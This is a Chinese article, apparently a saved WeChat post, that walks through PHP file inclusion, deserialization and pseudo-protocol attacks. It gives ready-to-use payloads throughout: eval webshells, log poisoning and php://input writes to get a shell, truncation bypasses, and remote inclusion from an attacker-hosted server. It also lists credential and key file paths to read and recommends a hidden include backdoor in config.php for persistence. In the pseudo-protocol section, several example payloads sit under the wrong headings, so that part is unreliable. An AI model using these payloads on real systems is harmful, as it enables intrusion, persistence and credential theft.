\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s?\_\_biz=MjM5NDUxMTI2NA==&mid=2247484563&idx=1&sn=0d286a4e4c5f92c36e7eead3465470e7&chksm=a687e45c91f06d4a0d9f8a57ef827b5edd871d407d735d1861dd4d001541e753d1c7cdabcaf6&scene=126&sessionid=1602140929&key=10b5f81a683662231a12088ff67e02c0d481c708c9ae7953c46a7e80ca0907b965f48351603bca805e4fce082e68682ca89241e114d109eb7f4398a4cdab5afec405bdff12c81983c76e7684bd4dcd720d789e449a5e3a0b922542eb52fc32698a0a77d36d0a2aee980d775c720cad50a8e183b1dbf4329793663aa6ef5680a2&ascene=1&uin=ODk4MDE0MDEy&devicetype=Windows+10+x64&version=62090529&lang=zh\_CN&exportkey=AT6nUDCHWDQvLHMRwkB0t4E%3D&pass\_ticket=MIT9gkwI%2Flz0hRXozp3zz%2FJGT8%2BgZgLCOBodXSLzGMJddkuYKwJy1I14m7NOwIdt&wx\_header=0)

以下主要是近期对 php 一些常见漏洞的梳理，包含 php 文件包含、php 反序列化漏洞以及 php 伪协议。其中 ：

```
\# php反序列参考链接：
https://www.cnblogs.com/xiaoqiyue/p/10951836.html
# php伪协议参考链接：
https://www.cnblogs.com/endust/p/11804767.html
```

**一、php 文件包含漏洞  
**

在开发中，开发人员会将一些重复使用的代码函数汇总放到单个文件中，需要使用某个函数时直接调用此文件。这个调用过程称为文件包含。为了使代码更灵活，将被包含的文件设置为变量用来进行动态调用。这就导致客户端可以调用一个恶意文件，造成文件包含漏洞。文件包含漏洞在 php 中居多。造成执行任意代码、包含恶意文件控制网站、敏感文件读取等危害

**1\. 常见包含函数**

*   include()：执行到 include 时才包含文件，找不到被包含文件时产生警告，但是脚本继续执行。
    
*   require()：程序一运行就包含文件，找不到被包含的文件产生致命错误，脚本停止运行
    
*   include\_once&require\_once()：这两个函数行为与 include/require 类似，区别在于他们只做一次包含，即如果文件中代码已经被包含则不会再次被包含
    

**2\. 利用条件**
------------

*   程序用 include() 等文件包含函数通过动态变量的方式引入需要包含的文件
    
*   用户能够控制该动态变量
    
*   配置文件 php.ini 中参数 allow\_url\_fopen=open，此参数默认为 open
    
*   远程包含则需要 php.ini 中参数 allow\_url\_include=open，此参数默认为 close
    

**3\. 包含分类**

*   本地文件包含：上传带有 shell 代码的任意格式文件，利用文件包含漏洞将该文件当作脚本格式解析。
    
*   远程文件包含：在远程服务器上放置大马以此绕过杀软提权
    

**4\. 利用方法**

*   包含日志文件 getshell
    
*   包含 data: 或 php://input 等伪协议
    
*   若有 phpinfo 则可以包含临时文件
    
*   如果一个网站有文件包含但是无法 getshell，尝试在旁站上上传图片马，然后进行文件包含拿 shell
    

**5\. 实例**  

假如目标网站有 news.php 文件，文件内容为：

```
<?php
$test=$\_GET\['id'\];   
include($test);
?>
```

此时该文件存在文件包含漏洞。include 函数通过动态变量的方式引入需要包含的文件，若用户能控制该变量；在同级目录下上传 test.txt 文件, 内容为：

```
<?php phpinfo()?>
```

*   此时访问测试：http://192.168.1.3/fileinclude/news.php?id=test.txt。将 test.txt 文件传送给 id 参数并复制给 test 变量，然后 txt 文件被当作 php 脚本脚本文件执行。
    
*   同时也可以任意包含，根据物理路径读取服务器敏感文件：
    

```
# 常见敏感文件l
http://192.168.1.3/fileinclude/news.php?id=c:\\\\1.txt
www.test.com/test.php?test=../../../../../etc/passwod
www.test.com/test.php?test=/etc/shadow
www.test.com/test.php?test=/etc/php5/apache2/php.ini
www.test.com/test.php?test=/etc/mysql/my.cnf
www.test.com/test.php?test=/etc/apache2/apache2.conf
------------------------------------------------------------------------------
windows敏感文件：
c:\\\\boot.ini
# 查看系统版本
c:\\\\windows\\\\system32\\\\inetsrv\\\\metabase.xml
# 查看iis配置文件
c:\\\\windows\\\\repair\\\\sam
# 存储系统初次安装的密码
c:\\\\program files\\\\mysql\\\\my.ini
# mysql配置文件
c:\\\\program files\\\\mysql\\\\data\\\\mysql\\\\user.myd
# mysql root密码
c:\\\\windows\\\\php.ini
# php配置信息
c:\\\\windows\\\\my.ini
# mysql配置信息
-------------------------------------------------------------------------------
/root/.ssh/authorized\_keys
/root/.ssh/id\_rsa
/root/.ssh/id\_ras.keystore
/root/.ssh/known\_hosts
/etc/passwd
/etc/shadow
/etc/my.cnf
/etc/httpd/conf/httpd.conf
/root/.bash\_history
/root/.mysql\_history
/proc/self/fd/fd\[0-9\]\*(文件标识符)
/proc/mounts
/porc/config.gz
```

**6\. 附加后缀截断**  

-----------------

例如包含读取 / etc/passwd 文件，网站源码会给一个后缀形成如：/etc/passwd.php, 导致无法读取文件内容。具体代码如下，此时该代码存在文件包含漏洞，由于在漏洞利用被包含的文件会被添加上. php 后缀，无法直接利用。

```
<?php
$test=$\_GET\['id'\];   
include($test).'.php';
?>
```

**绕过方法一：%00 截断**

```
http://www.test.com/test/a.php?c=1.txt%00
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviauAg5IUcibn9aNV4Md2F3bCD71jGhe2MrFG7GTNs1evKroOLeFGmccRw/640?wx_fmt=png)

**注意**：%00 截断包含适合 php 版本 < 5.3.4，对应版本的配置文件 magic\_quotes\_gps=off，才能够进行绕过，否则 %00 会被转义。

****绕过方法二：**文件名附加./././././. 进行长度截断**

```
http://www.test.com/test/a.php?c=1.txt/././././././././././././././././././....
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviabmWJ1gt5BDlFrYLEzibWctHJ8XW186ibCtZjWpRR4sbcz3qgTOHDYkQQ/640?wx_fmt=png)  

注意：Windows 服务器字节长度应大于 256，Linux 要大于 4096  

**7\. 包含日志拿 shell  
**

```
#文件包含漏洞读取apache配置文件
index.php?page=/etc/init.d/httpd
index.php?page=/etc/httpd/conf/httpd.conf
#Linux默认访问url的日志
/var/log/httpd/access\_log 
#网站访问日志无权限访问，但是cms本身会记录错误日志，这种日志可以访问
```

**拿 shell 步骤**  

*   访问../file.php?id=1<?php @eval($\_POST\[a\]);?>
    
*   后台在 / var/log/httpd/acess\_log 会生成带有一句话的日志，相当与将一句话以. log 形式写入了网站目录
    
*   然后根据文件包含漏洞 > 连接../file.php?file=…/…/…/…/var/log/httpd/acess\_log，getshell
    

**实例：**ekucms 某版本存在文件包含漏洞  

①通过访问该 url，将一句话木马写入日志文件中

```
http://192.168.1.3/ekucms2.4.1/?s=my/show/id/{~eval($\_POST\[x\])}
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaJbDROFlF31hnBjaMcPUhrwJHfhTJqWB6MlG44bFvacX141hbQTfCrA/640?wx_fmt=png)

②该日志是以时间日期命名的，用菜刀连接该日志文件，得到 shell

```
http://192.168.1.3/ekucms2.4.1/?s=my/show/id/\\..\\temp\\logs\\20\_05\_18.log
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviamgKbpRSeFFcrlyPKA9LqZJN15z54qSh8xiaZicSibQvgVyAL7BoWDiabCw/640?wx_fmt=png)  

**8\. 读源代码**
------------

直接读取 php 文件返回的是代码编译解析后的结果，并不能看到源代码。

```
http://192.168.1.3/news.php?id=shell.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviapLcmGjHopVo1cczYxIvJ5XLrOicamln3sic7zT6K83ZfTd12dVDXhRgw/640?wx_fmt=png)  

此时可以使用封装伪协议读取：

```
http://192.168.1.3/news.php?id=php://filter/read=convert.base64-encode/resource=shell.php
//核心代码：id=php://filter/read=convert.base64-encode/resource=
//读出源代码，原理是将文件内容进行base64加密，使代码不运行解析，直接读出源代码。
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaCibKAHY94jY4lniambMibTbia7ZicaPLvqtkKNv29sRibAAva9bpiahn1WTcw/640?wx_fmt=png)  

**9\. 远程文件包含**

远程文件包含文件名不能为 php 可解析的扩展名。另外远程文件包含要确保 php.ini 中 allow\_url\_fopen 和 allow\_url\_include 状态为 on。为躲避杀软将大马放到自己的 vps 上然后远程包含。  

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaUib6I4GL7tS8pCYacpy5wTVoXibkNGfmMncM4uPfVxC0zpgF6w2WHiavg/640?wx_fmt=png)

```
http://192.168.1.3/1.php?file=http://www.xxxx.com/1.png
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcvia5JqTMYrak9nqkia86RmJABJe0hWyrN5prYAXsc8uEzicgsicib10LVV1KQ/640?wx_fmt=png)

**远程包含限制绕过后缀名限制：  
**

```
#源代码
<?php 
include($\_GET\['filename'\] . ".html"); 
?>
```

与本地包含类似，如果源码存在后缀名限制，直接进行远程包含的话会报错如下：

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviahjbjyjextu7v9yhTO5nuu3J1ptyIKloZYJkHC9gzdicDBp0OWZz6bHw/640?wx_fmt=png)

**绕过方法：**  

```
filename=http://www.xxx.com/FI/php.txt?
filename=http://www.xxx.com/FI/php.txt%23
filename=http://www.xxxi8.com/FI/php.txt%20
filename=http://www.xxx.com/FI/php.txt%00
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaAQiarJoyjibmrZu5iaNbfaKVP9joWznYUkjfS5ZbwNHVcAdiaIk2giasy2Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcvia0qtetZwiaBeticdzSJhoUFo20diaG0WY98L8j2BblnIibosqfrnHy5E6EQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcvia8dx8JJibZQIjMib4Rf10c8fib3elnhzIaDvW858GE6jRl1ImCzjV5enyA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviauic52y355keQiaJCYvNCtO0ujgbpNKFUOZ8JEZsBpAhrlRQy4T0UYJhw/640?wx_fmt=png)

**利用远程文件包含进行权限维持**
------------------

include 代码不会报毒。所以我们在 getshell 后在网站配置文件中写入包含代码 (如：config.php,<?php include($\_GET\['x'\]);?> 管理员一般不会修改配置文件源代码) 里面插入文件包含代码。如果目标 allow\_url\_fopen 和 allow\_url\_include 状态都为 on。既可以永久进行远程包含，达到权限维持的目的。

**二、漏洞梳理篇之 php 反序列化漏洞**
=======================

**1\. 序列化函数 serialize()**

序列化的目的是方便数据的传输和存储。当在 php 中创建了一个对象后，可以通过 serialize() 函数把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。测试代码如下；

```
<?php
class chybeta{
    var $test = '123';
}
$class1 = new chybeta;
$class1\_ser = serialize($class1);
print\_r($class1\_ser);
?>
#创建一个对象，然后序列化并输出
```

代码执行输出结果：_O:7:“chybeta”:1:{s:4:“test”;s:3:“123”;}_

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviajGhU1YBbrjjGXL3INnRzUnhO5LPytCo4MzyauheqDVlEsZnib4OPlYw/640?wx_fmt=png)  

返回结果中各字符的含义分别为：

```
O  代表存储的是对象（object）,假如你给serialize()传入的是一个数组，那它会变成字母a。
7  表示对象的名称有7个字符。"chybeta"表示对象的名称。
1  表示有一个值
    {s:4:"test";s:3:"123";}中，
    s  表示字符串
    4  表示该字符串的长度，
    "test"  为字符串的名称
    "123"   为字符串的内容
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaicLJmml07U1Uwt0uPWN0ljSXmWKtSm1uBWFwCnian9mAUjMrr1CaEuEw/640?wx_fmt=png)

**2\. 反序列化函数 unserialize()**

与 serialize() 对应的，unserialize() 可以从已存储的表示中创建 PHP 的值，单就本次所关心的环境而言，可以从序列化后的结果中恢复对象。测试代码：

```
<?php
class chybeta{
    var $test = '123';
}
$class2 = 'O:7:"chybeta":1:{s:4:"test";s:3:"123";}';    
print\_r($class2);
echo "</br>";
$class2\_unser = unserialize($class2);
print\_r($class2\_unser);
?>
#给定一串序列化后的字符将其反序列化并打印
```

执行结果：

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcvia9ict95PmSjKqEHHmVicJnnPH73vrsHKp2azsDcpmxrpsDhQGMPTbvbFQ/640?wx_fmt=png)

当传给 unserialize() 函数的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。  

**3.php 反序列化漏洞**  
由于未对用户输入的序列化字符串进行检测，导致攻击者控制反序列化过程，从而导致代码执行，SQL 注入，目录遍历等不可控后果。  

**漏洞触发条件：**

*   unserialize 函数的变量可控
    
*   php 文件中存在可利用的类
    
*   类中有魔术方法。
    

php 中有一类特殊的方法叫 “Magic function”，在反序列化的过程中会自动触发这些魔术方法。

*   \_\_construct()：当对象创建 (new) 时会自动调用。但在 unserialize()时是不会自动调用的
    
*   \_\_destruct()：当对象被销毁时会自动调用
    
*   \_\_wakeup() ：unserialize() 时会自动调用
    

unserialize() 导致\_\_wakeup() 或\_\_destruct() 的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞 / 危害代码存在于\_\_wakeup() 或\_\_destruct() 等构造函数中，当我们控制序列化字符串时可以去直接触发它们。

针对 \_\_wakeup() 场景实验，序列化漏洞代码如下：

```
<?php
class chybeta{
    var $test = '123';
    function \_\_wakeup(){
        $fp = fopen("shell.php","w") ;
        fwrite($fp,$this->test);
        fclose($fp);
    }
}
$class3 = $\_GET\['test'\];
print\_r($class3);
echo "</br>";
$class3\_unser = unserialize($class3);
?>
```

**反序列化漏洞思路**  
1\. 本地搭建好环境后，通过 serialize() 得到我们要的序列化字符串，例如这里序列化 phpinfo 得到序列化内容为：_**O:7:“chybeta”:1:{s:4:“test”;s:19:"<?php phpinfo(); ?>";}  
**_

2\. 执行含有 php 反序列化漏洞的代码，即访问 http://localhost/index.php?test=O:7:%22chybeta%22:1:{s:4:%22test%22;s:19:%22%3C?php%20phpinfo();?%3E%22;}

3\. 通过源代码知，把对象中的 test 值赋为 “<?php phpinfo(); ?>”, 调用 unserialize() 函数，通过\_\_wakeup() 执行代码将传入的参数进行反序列化处理如下图，成功显示了 phpinfo 页面：在反序列化该数据时，自动触发了构造函数, 执行 phpinfo():

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaDOhLrunluHicyuuocO9nMy1BU18EAnfWJdmsTgK3Gyebl5rFxu5Uqmw/640?wx_fmt=png)

**三、漏洞梳理篇之 php 伪协议**

**1\. 环境概要：**
-------------

PHP 伪协议指的是 PHP 所支持的协议与封装协议，在 web 渗透漏洞利用中常用于配合文件包含进行 web 攻击，从而获取网站权限。

**①php.ini 配置文件参数：**

*   allow\_url\_fopen ：on # 默认开启 ，表示允许 url 里的封装协议访问文件；
    
*   allow\_url\_include：off  # 默认关闭，表示不允许包含 url 里的封装协议包含文件；
    

**②常用伪协议条件及方法  
**

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviatnuqm45lc6Z12UwmcLjcic368xMzicHyLlmMy8XadsEJvZmCT98JvnFQ/640?wx_fmt=png)  

**③注意点**

*   各个伪协议适用 php 版本不尽相同，以下实验环境 php 版本在 5.2~5.7 之间疯狂来回切换，到最后已经无法总结各协议实验成功所使用的 php 版本。**总之：php>5.2.0**
    
*   以下所有实例均使用 Firefox 浏览器
    

**2\. 伪协议实例**
-------------

### **①php://input**

php://input 是可以访问请求原始数据的只读流。在 POST 请求的情况下，由于 php://input 不依赖于特定的 php.ini 指令，可以使用它代替 $HTTP\_RAW\_POST\_DATA

**注意点**  

*   input 必须以 post 请求
    
*   enctype=“multipart/form-data” 的时候 php://input 是无效的
    
*   allow\_url\_include=on
    

**实例一：php://input 将文件包含漏洞变成代码执行漏洞**

1）目标网站存在包含漏洞

```
<?php @include($\_GET\["file"\])?>
```

2）使用 php://input，将执行代码通过在 POST data 中提交。形成命令执行

```
<?php system('ipconfig');?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcvia6LwhCwNGJS8YppnelaAZCVmjZwrvNxRtJESFh4AgCCvS4eJjmmNU4A/640?wx_fmt=png)  

**实例二：php://input 利用文件包含写入 shell**

1）目标网站存在包含漏洞

```
<?php @include($\_GET\["file"\])?>
```

```
#post方式提交
<?php 
echo file\_put\_contents("test.php",base64\_decode("PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4="));
?>
```

```
<?php 
$data = file\_get\_contents('php://input'); 
eval($data); 
?>
```

执行成功会在当前目录下生成一句话 shell，可直接连接

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcvia2V458kKL8qCy7QKQ02YWwbdLRlWWAzIMQcMoU5thcYbe1GADSfAl4Q/640?wx_fmt=png)  

**实例三：php://input 协议直接写入 shell**

1）含有 php://input 的代码漏洞文件：

```
echo file\_put\_contents("ceshi.php",base64\_decode("PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4="));
```

POST 直接传参执行 php 代码：

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaO7wtHcewfZd3bJdh4LaNuiceeAe9I8jEckRDRQo53TaCSD3SaDkg6XQ/640?wx_fmt=png)

同理，这里在 post 数据提交生成 shell 的代码，会在同级目录下生成 shell：

```
#文件包含代码：
<?php include $\_GET\['file'\]?>   
访问执行：
127.0.0.1/1.php?file=data:text/plain;base64,PD9waHAKcGhwaW5mbygpOwo/Pg==
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviasKxh40I9V3LbhFYdhpq28GRZq8Jk9ibU8zicVSZz29g2W56A8E805jbw/640?wx_fmt=png)

### **②data:URL 代码执行**  

将攻击代码转换为 data:URL 形式进行攻击，以传递相应格式的数据用来执行 PHP 代码。为了防止直接在 URL 连接中的一些敏感字符被 waf 检测拦截，可将攻击代码进行 base64 编码。

```
?file=php://filter/read=convert.base64-encode/resource=1.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaOAL1n7IdCiaONziaZzgwnbejzWQW7VAxz7gYvcCxG4je6kqzbq4AHNYg/640?wx_fmt=png)

条件：allow\_url\_include = on&allow\_url\_fopen()=on& PHP>= 5.2.0

### **③php://filter 读取源代码**

php://filter 用于读取网站源码。读取 php 文件源码内容 (直接包含脚本格式文件会解析无法直接获取文件源码)。用法：

```
?file=file:///C:\\\\phpStudy\\\\WWW\\\\fileinclude\\\\2\\\\1.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaSiaCrfhVbCH2fLuWFDCiakfbPiavHcM2jicRV8SbbJzutSAtZOsibt5fz6A/640?wx_fmt=png)  

### **④file:// 物理路径包含文件**

file:// 协议在 allow\_url\_fopen,allow\_url\_include 都为 off 的情况下也可以正常使用：

```
?file=data://text/plain,%3C?php%20system(%27whoami%27);?%3E
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviayLytiaOQWWdWIRiaANpMxoR6G0Y1IuQaUuMgJvkLediauN6bldevIU7yA/640?wx_fmt=png)

### **⑤data://: 利用文件包含 & data:// 进行命令执行**

```
\# 验证包含对象文件后缀是否为jpg，如果是才进行包含
<?php
$file = $\_GET\['file'\];
if(isset($file) && strtolower(substr($file, -4)) == ".jpg"){
    include($file);
}
?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaVAjK4GGn42RRW1U9Ij3ct4KI7rELTZ9zNRbevsFzPW8AZm1Nrfd8Rg/640?wx_fmt=png)  

**⑥zip:// 绕过文件包含下的附加后缀  
**

以下两串代码是对文件后缀进行验证或修改然后再进行包含。对于此类情况，如果要包含非预定文件后缀的文件，可以通过 %00 截断进行绕过。但是 %00 截断在 php 版本 5.3.4 之后就失效了，而且还要考虑 GPC，限制比较严重。除此之外，可以通过 zip 协议和 phar 协议来包含文件，突破附加后缀限制。

```
#直接为包含对象添加jpg后缀，然后进行包含
<?php
$file = $\_GET\['file'\];
include($file.'.jpg');
?>
```

```
?file=zip://php.zip%23php.jpg
```

**绕过方法：**  
1）实战情况下向目标站点上传 zip 文件，里面压缩着一个 jpg 格式的 php 脚本

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaNyf5jbw1yic5AoQMk50icWwJu2QE4RgcZ5qnN3jbVBgtV9oibwfg7OibHQ/640?wx_fmt=png)

2）构造 zip://php.zip#php.jpg，进行 zip:// 伪协议绕过后缀名限制。这里将压缩文件里面的内容修改为在当前目录下生成一句话即可 getshell。  

```
?file=zip://php.zip%23php.jpg
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZdzydTyF3UI7NibnZTdRcvia7EpT1mr66AX7kXuC5eclOXwRwnTlxdtjLTobmlpPT7icgfMGjPvnLqQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/flBFrCh5pNZdzydTyF3UI7NibnZTdRcviaufQg0mZep5NxOuiadM8XnUP5Ol02mMdehIsWMaPic4v2wAE4WYIcbhUw/640?wx_fmt=jpeg)